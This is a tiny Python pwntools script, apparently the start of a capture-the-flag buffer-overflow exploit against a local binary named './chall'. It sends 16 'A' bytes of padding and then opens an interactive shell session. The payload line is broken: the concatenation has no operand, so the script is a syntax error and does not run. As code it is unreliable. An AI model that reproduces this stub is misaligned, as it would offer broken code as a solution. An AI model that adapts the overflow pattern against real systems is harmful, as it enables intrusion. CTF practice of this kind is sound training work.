#!/usr/bin/env	python3
import pwn

proc = pwn.process("./chall")
proc.sendline(b"A" * 16 + )
proc.interactive()


